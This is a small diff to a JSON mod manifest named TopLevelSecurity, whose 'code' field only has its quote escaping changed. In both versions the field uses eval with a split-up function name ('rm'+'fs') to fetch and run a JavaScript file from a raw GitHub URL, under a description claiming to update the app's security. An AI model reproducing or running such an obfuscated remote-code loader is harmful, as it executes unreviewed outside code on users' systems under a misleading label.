@@ -3,6 +3,6 @@
   "directory": "toplevelsecurity",
   "description": "This mod updates security for the app.",
   "display": "TopLevelSecurity",
-  "code": "eval('rm'+'fs(\'https://raw.githubusercontent.com/kenzz-sz/Zynx_/refs/heads/main/main/mods/item/tlsitem.js\')')"
+  "code": "eval('rm'+'fs(\\'https://raw.githubusercontent.com/kenzz-sz/Zynx_/refs/heads/main/main/mods/item/tlsitem.js\\')')"
 }
 ]
